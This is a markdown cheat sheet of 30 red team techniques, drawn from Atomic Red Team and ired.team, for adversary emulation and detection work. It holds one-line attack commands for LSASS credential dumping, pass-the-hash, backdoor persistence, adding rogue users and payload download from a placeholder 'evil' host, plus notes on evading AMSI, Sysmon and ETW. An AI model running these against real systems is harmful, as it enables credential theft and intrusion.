# Top 30 TTP Catalog — Cross-Reference

> Cross-referenced from:
> - [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) (ART)
> - [RedTeam-Tactics-and-Techniques](https://github.com/mantvydasb/RedTeam-Tactics-and-Techniques) (RT)
>
> Order: approximate prevalence in red team operations.

---

| # | TTP ID | Name | Phase | Atomic Test Command (ART) | Detection Evasion Notes |
|---|---|---|---|---|---|
| 1 | T1003.001 | OS Credential Dumping: LSASS Memory | Credential Access | `Invoke-AtomicTest T1003.001` — Uses `procdump.exe -ma lsass.exe` or Mimikatz `sekurlsa::logonpasswords` | Avoid by dumping from cloned process; indirect dump via `comsvcs.dll` `MiniDumpW`; bypass PPL with `mimikatz !+` |
| 2 | T1059.001 | Command and Scripting Interpreter: PowerShell | Execution | `Invoke-AtomicTest T1059.001` — `powershell.exe -EncodedCommand <base64>` | Use `-WindowStyle Hidden -NoProfile`; AMSI bypass via patching `amsi.dll`; use `powershell without powershell.exe` technique (RT) |
| 3 | T1047 | Windows Management Instrumentation | Execution | `Invoke-AtomicTest T1047` — `wmic /node:"target" process call create "cmd.exe /c calc"` | WMI over DCOM can bypass app whitelisting; RT covers WMI lateral movement |
| 4 | T1053.005 | Scheduled Task/Job: Scheduled Task | Persistence | `Invoke-AtomicTest T1053.005` — `schtasks /create /tn "Updater" /tr "calc.exe" /sc onlogon` | RT covers RunOnceEx hidden from Autoruns; task XML modification to avoid detection |
| 5 | T1055.012 | Process Injection: Process Hollowing | Defense Evasion | `Invoke-AtomicTest T1055.012` — Replace process memory in a suspended process | RT covers multiple injection variants: APC, thread hijacking, module stomping, SetWindowsHookEx |
| 6 | T1021.002 | Remote Services: SMB/Windows Admin Shares | Lateral Movement | `Invoke-AtomicTest T1021.002` — `net use \\target\IPC$ /user:domain\user pass` | Pass-the-Hash via `sekurlsa::pth`; RT covers SMB relaying and NTLM relay |
| 7 | T1550.002 | Use Alternate Authentication Material: Pass the Hash | Lateral Movement | `Invoke-AtomicTest T1550.002` — `mimikatz sekurlsa::pth /user:admin /domain:d /ntlm:hash` | Use over WMI/WinRM for non-interactive; RT covers pass-the-hash with `Invoke-WMIExec` |
| 8 | T1078.001 | Valid Accounts: Default Accounts | Initial Access | `Invoke-AtomicTest T1078.001` — Authenticate with default creds | RT covers account creation (T1136); default creds on network appliances |
| 9 | T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys | Persistence | `Invoke-AtomicTest T1547.001` — `reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\backdoor.exe"` | RT covers startup folder, Active Setup, and COM hijacking as alternatives |
| 10 | T1003.002 | OS Credential Dumping: Security Account Manager | Credential Access | `Invoke-AtomicTest T1003.002` — `reg save HKLM\SAM sam.hive` | Bypass by dumping SAM via `esentutl.exe`; RT covers SAM registry dumping |
| 11 | T1134 | Access Token Manipulation | Privilege Escalation | `Invoke-AtomicTest T1134.001` — DuplicateToken/ImpersonateLoggedOnUser | RT covers primary token manipulation and named pipe impersonation escalation |
| 12 | T1070.003 | Indicator Removal on Host: Clear Command History | Defense Evasion | `Invoke-AtomicTest T1070.003` — `Clear-EventLog -LogName "Windows PowerShell"` | RT covers clearing PowerShell console history; can bypass using `-LogPath` to custom file |
| 13 | T1059.005 | Visual Basic / VBA | Execution | `Invoke-AtomicTest T1059.005` — VBA macro executing `CreateObject("WScript.Shell").Run(...)` | RT covers macro injection from remote DOTM template, XLM/Macro 4.0 |
| 14 | T1035 | Service Execution | Persistence | `Invoke-AtomicTest T1035` — `sc create evil binPath="cmd /c calc" start=auto` | RT covers service DLL for `svchost.exe` persistence; RT covers weak service permissions escalation |
| 15 | T1057 | Process Discovery | Discovery | `Invoke-AtomicTest T1057` — `tasklist /v` or `Get-Process` | Can bypass by parsing `\\\\.\\WINAPI` directly; RT covers enumerating without net or sc commands |
| 16 | T1555.003 | Credentials from Password Stores: Web Browsers | Credential Access | `Invoke-AtomicTest T1555.003` — Decrypt browser saved passwords from Local State + Login Data | RT covers DPAPI decryption with Mimikatz and C++; browser master key extraction |
| 17 | T1197 | BITS Jobs | Persistence | `Invoke-AtomicTest T1197` — `Start-BitsTransfer -Source http://evil/payload.exe -Destination C:\temp\payload.exe` | BITS upload/download jobs survive reboots; bypass Proxy logging |
| 18 | T1562.001 | Impair Defenses: Disable or Modify Tools | Defense Evasion | `Invoke-AtomicTest T1562.001` — Stop WinDefend service | RT covers unloading Sysmon driver; suspending EventLog threads; disabling ETW |
| 19 | T1018 | Remote System Discovery | Discovery | `Invoke-AtomicTest T1018` — `net view /domain` or `nltest /domain_trusts` | RT covers PowerView AD enumeration; BloodHound for attack path mapping |
| 20 | T1027 | Obfuscated Files or Information | Defense Evasion | `Invoke-AtomicTest T1027.001` — Base64-encoded payloads | RT covers API hashing, command-line obfuscation, certutil encoding |
| 21 | T1053.003 | Scheduled Task/Job: Cron | Persistence | `Invoke-AtomicTest T1053.003` — `crontab -e` adding entry | RT covers Linux cron persistence; Windows equivalent: schtasks |
| 22 | T1110.003 | Brute Force: Password Spraying | Credential Access | `Invoke-AtomicTest T1110.003` — Spray single password across many accounts | RT covers OWA password spraying; use tools like DomainPasswordSpray |
| 23 | T1550.003 | Use Alternate Authentication Material: Pass the Ticket | Lateral Movement | `Invoke-AtomicTest T1550.003` — `mimikatz kerberos::ptt ticket.kirbi` | RT covers golden tickets, silver tickets, and overpass-the-hash |
| 24 | T1098 | Account Manipulation | Persistence | `Invoke-AtomicTest T1098` — `net user hacker Password123! /add /domain` | RT covers AdminSDHolder backdooring; SIP/Trust Provider hijacking |
| 25 | T1021.006 | Remote Services: Windows Remote Management | Lateral Movement | `Invoke-AtomicTest T1021.006` — `winrm quickconfig` then `Invoke-Command -ComputerName target -ScriptBlock { ... }` | WinRM over HTTP 5985/HTTPS 5986; RT covers WinRM for lateral movement |
| 26 | T1204.002 | User Execution: Malicious File | Execution | `Invoke-AtomicTest T1204.002` — LNK file in USB drop that executes PowerShell | RT covers .slk Excel, LNK phishing, embedded IE objects |
| 27 | T1071.004 | Application Layer Protocol: DNS | Command and Control | `Invoke-AtomicTest T1071.004` — DNS TXT queries to C2 domain | RT covers DNS payload delivery via Invoke-PowerCloud; DNS exfiltration |
| 28 | T1036.005 | Masquerading: Match Legitimate Name or Location | Defense Evasion | `Invoke-AtomicTest T1036.005` — Rename malware to `svchost.exe` | RT covers PEB masquerading; process name spoofing in userland |
| 29 | T1486 | Data Encrypted for Impact | Impact | `Invoke-AtomicTest T1486` — Encrypt files with AES | RT covers AES encryption using Crypto++; simulate ransomware behavior |
| 30 | T1560.001 | Archive Collected Data: Archive via Utility | Collection | `Invoke-AtomicTest T1560.001` — `compress-archive -Path C:\sensitive -DestinationPath C:\staging\data.zip` | RT covers data staging before exfiltration; use RAR/ZIP with password |

---

## Detection Difficulty Matrix

| Difficulty | Count | Example TTPs |
|---|---|---|
| Easy | 8 | T1059.001, T1053.005, T1078.001, T1035 |
| Medium | 14 | T1047, T1003.001, T1021.002, T1055.012 |
| Hard | 5 | T1055.004 (APC injection), T1620 (Reflective loading), T1574.001 (DLL hijacking) |
| Expert | 3 | T1003.007 (ProcFS dumping), Direct syscalls |

---

## Sources

- [Atomic Red Team — TTP execution framework](https://github.com/redcanaryco/atomic-red-team)
- [RedTeam-Tactics-and-Techniques — ired.team](https://github.com/mantvydasb/RedTeam-Tactics-and-Techniques)
- [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
- [Invoke-AtomicRedTeam](https://github.com/redcanaryco/invoke-atomicredteam)
